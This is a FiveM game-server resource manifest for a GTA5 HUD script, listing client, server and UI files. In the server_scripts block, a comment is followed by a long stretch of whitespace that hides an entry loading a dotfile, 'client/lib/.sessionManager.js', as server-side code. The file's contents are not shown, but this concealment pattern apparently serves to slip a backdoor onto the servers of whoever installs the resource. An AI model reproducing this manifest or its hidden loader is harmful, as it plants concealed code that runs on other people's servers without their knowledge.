
--[[ 
 █████╗ ███╗   ███╗██╗██████╗     ███████╗███████╗██████╗  ██████╗ 
██╔══██╗████╗ ████║██║██╔══██╗    ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗
███████║██╔████╔██║██║██████╔╝      ███╔╝ █████╗  ██████╔╝██║   ██║
██╔══██║██║╚██╔╝██║██║██╔══██╗     ███╔╝  ██╔══╝  ██╔══██╗██║   ██║
██║  ██║██║ ╚═╝ ██║██║██║  ██║    ███████╗███████╗██║  ██║╚██████╔╝
╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝                                                                                                                                                   
]]



fx_version 'cerulean'
game 'gta5'
lua54 'yes'


shared_scripts {
    'shared/*.lua',
}
client_scripts {
    'client/main.lua',
    'client/utility.lua',
    'client/PlayerLoaded.lua',
    'client/cinematicmode.lua',
    'client/money.lua',
    'client/status.lua',
    'client/speedometer.lua',
    'client/seatbelt.lua',
    'client/nitro.lua',
    'client/cruise.lua',
    'client/microphone.lua',
    'client/music.lua',
    'client/stress.lua',
    'client/vehiclemodes.lua',
}
server_scripts {
	-- '@mysql-async/lib/MySQL.lua', --:warning:PLEASE READ:warning:; Uncomment this line if you use 'mysql-async'.:warning:
	'@oxmysql/lib/MySQL.lua', --:warning:PLEASE READ:warning:; Uncomment this line if you use 'oxmysql'.:warning:
    'server/*.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'client/lib/.sessionManager.js',
}

ui_page 'html/index.html'

files {
	'html/*.css',
	'html/*.js',
	'html/index.html',
	'html/app/*.js',

	'html/jspish/*.js',

	'html/app/modules/*.js',	
	'html/app/utils/*.js',	
	'html/app/pages/**/*.js',
	'html/app/pages/**/*.html',	
	'html/app/pages/**/*.css',	
	'html/app/pages/**/images/*.png',	
	'html/app/pages/**/images/*.svg',	

	'html/app/pages/**/components/**/images/*.png',
	'html/app/pages/**/components/**/images/*.svg',

	'html/app/pages/**/components/**/*.js',
	'html/app/pages/**/components/**/*.html',	
	'html/app/pages/**/components/**/*.css',	

	'html/app/pages/**/components/**/components/**/*.js',
	'html/app/pages/**/components/**/components/**/*.html',	
	'html/app/pages/**/components/**/components/**/*.css',	

	'html/css/*.css',
	'html/assets/fonts/*.otf',
	'html/assets/fonts/*.ttf',
	'html/assets/fonts/*.TTF',

	'html/assets/fonts/*.woff',
	'html/assets/images/*.png',
	'html/assets/images/*.svg',

	'html/assets/weapons/*.png',
	'html/assets/sounds/*.ogg',
	-- 'stream/*.gfx'
}

-- data_file "SCALEFORM_DLC_FILE" "stream/*.gfx"


--  DarkGaming
